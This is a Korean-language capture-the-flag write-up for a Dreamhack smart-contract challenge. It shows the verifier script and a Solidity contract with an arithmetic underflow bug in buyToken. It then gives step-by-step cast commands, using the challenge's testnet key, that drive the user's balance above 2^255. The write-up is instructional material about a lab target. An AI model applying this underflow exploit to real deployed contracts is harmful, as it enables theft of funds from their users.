```python
from web3 import Web3
import os

rpc_url = os.environ["RPC_URL"]
contract_address = os.environ["LEVEL_CONTRACT_ADDRESS"]
user_address = os.environ["USER_ADDRESS"]

ABI = [
    {
        "type": "function",
        "name": "balance",
        "inputs": [{"name": "", "type": "address"}],
        "outputs": [{"name": "", "type": "uint"}],
        "stateMutability": "view",
    }
]

def verify():
    w3 = Web3(Web3.HTTPProvider(rpc_url))
    assert w3.is_connected(), "RPC server must be connectable"

    contract = w3.eth.contract(address=contract_address, abi=ABI)
    user_balance = contract.functions.balance(user_address).call()
    //User 잔액이 2^255인지 확인 
    return user_balance >= (1 << 255)

if __name__ == "__main__":
    if verify():
        exit(0)
    exit(1)
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Level {
    mapping(address => mapping(string => uint)) public inventory;
    mapping(string => uint) public tokenCost;
    mapping(address => bool) public hasReceivedFreeMoney;
    mapping(address => uint) public balance;

    uint immutable fee;

    constructor () public {
        tokenCost["amo"] = 9254;
        tokenCost["boko"] = 6553;
        tokenCost["nando"] = 2178;

        fee = 0x10;
    }

    function getFreeMoney() public returns (bool) {
        if (hasReceivedFreeMoney[msg.sender])
            return false;
        
        hasReceivedFreeMoney[msg.sender] = true;
        balance[msg.sender] += 0x10000;
        return true;
    }

    function checkOverflow(uint costPerItem, uint amount) private view {
        require(costPerItem != 0, "There is no such token");
        require(amount != 0, "You need to buy at least one item");
				 
				uint totalCost = costPerItem * amount;
        require(totalCost / amount == costPerItem, "No overflow in multiplication :(");
        //살 돈 있는지 체크 
        require(balance[msg.sender] >= totalCost, "You do not have enough money :(");
    }
		//이 function 호출하면 
    function buyToken(string memory tokenName, uint amount) public {
		    //tokenName의 cost 
        uint costPerItem = tokenCost[tokenName];
        //그것과 amount와 비교 
        checkOverflow(costPerItem, amount);
				
				//여기를 음수로 만들면 balance는 uint이니까 오히려 커짐 
        balance[msg.sender] -= costPerItem * amount + fee;
        inventory[msg.sender][tokenName] += amount;
    }
}

```

exploit 설계 흠.. 

1. 일단 getFreeMoney 받고 
2. costPerItem*amout + fee가 balance보다 크면 계산 결과가 음수인데 balance는 uint이니까 0보다 작음 → 오히려 balance[msg.sender] 커짐 

- `balance[msg.sender] (= 0x10000) >= costPerItem * amount`
- `balance[msg.sender] < costPerItem * amount + fee`

두 개 조건 충족하는 토큰과 개수 짝 

실행하면 6553이 토큰 개수 10개일 때 두 조건 모두 충족 

1. getFreeMoney()를 통해 돈 받고 
2. buyToken()으로 boko 토큰 10개 구매 

처음엔 curl로 입력하려다가 json-rpc 파싱이 번거로워서 cast 사용 

```bash
% curl -Ls -w '\nREDIRECT TO: %{url_effective}\n' http://host8.dreamhack.games:18173/start
{"message":"\nPOST /2e860417731f/rpc/ : Testnet RPC endpoint. Starts the testnet if it's not running\nGET /2e860417731f/info/ : Get information to solve the challenge. Starts the testnet if it's not running\nGET /2e860417731f/reset/: Shutdown and reset the testnet\nGET /2e860417731f/flag/ : Get flag\n"}
REDIRECT TO: http://host8.dreamhack.games:18173/2e860417731f

% curl -Ls -w '\nREDIRECT TO: %{url_effective}\n' http://host8.dreamhack.games:18173/2e860417731f/info/
{"message":{"level_contract_address":"0x99468C5041B4F01553F3Da58D93EF4468232c559","user_private_key":"0xa4914546e88cc1bdeb6d858580fbb3b9e847c73c942615ff10ddf47da88155f9","user_address":"0x2f9DcbD81682512799249bd9C9F122247CAd8a1B"}}
REDIRECT TO: http://host8.dreamhack.games:18173/2e860417731f/info
```

```bash
% cast send --private-key 0xa4914546e88cc1bdeb6d858580fbb3b9e847c73c942615ff10ddf47da88155f9 \
  --rpc-url http://host8.dreamhack.games:18173/2e860417731f/rpc 0x99468C5041B4F01553F3Da58D93EF4468232c559 \
 "getFreeMoney()(bool)"

blockHash            0x78c5e976708a08a0d1aa55e505e56f32f0e75bc44a2539e9fb443695c8630f95
blockNumber          2
contractAddress      
cumulativeGasUsed    65866
effectiveGasPrice    878984185
from                 0x2f9DcbD81682512799249bd9C9F122247CAd8a1B
gasUsed              65866
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0x905156f855f0a149c8b2fd4b58d7e95897a175301d6cfc0960e0d1b5cf24c843
transactionIndex     0
type                 2
blobGasPrice         
blobGasUsed          
to                   0x99468C5041B4F01553F3Da58D93EF4468232c559
root                 115427844573721486570671751881716913473641648649747222476488752249067925170492
```

```bash
% cast send --private-key 0xa4914546e88cc1bdeb6d858580fbb3b9e847c73c942615ff10ddf47da88155f9 \
  --rpc-url http://host8.dreamhack.games:18173/2e860417731f/rpc 0x99468C5041B4F01553F3Da58D93EF4468232c559 \
 "buyToken(string memory, uint)" boko 10

blockHash            0xe3de54e1e6c2d9d0b54e4b2018ad867b561f1a462cfab4d2ed589ea09bdb4a55
blockNumber          3
contractAddress      
cumulativeGasUsed    52464
effectiveGasPrice    769593622
from                 0x2f9DcbD81682512799249bd9C9F122247CAd8a1B
gasUsed              52464
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0x1bd85d3b9bdcdd3d5e4e57054d131ab0f66a1524e95bf528bb33ed6e359946fc
transactionIndex     0
type                 2
blobGasPrice         
blobGasUsed          
to                   0x99468C5041B4F01553F3Da58D93EF4468232c559
root                 77665199393442906975085071370122769406295526111059288502224325884452463181468
```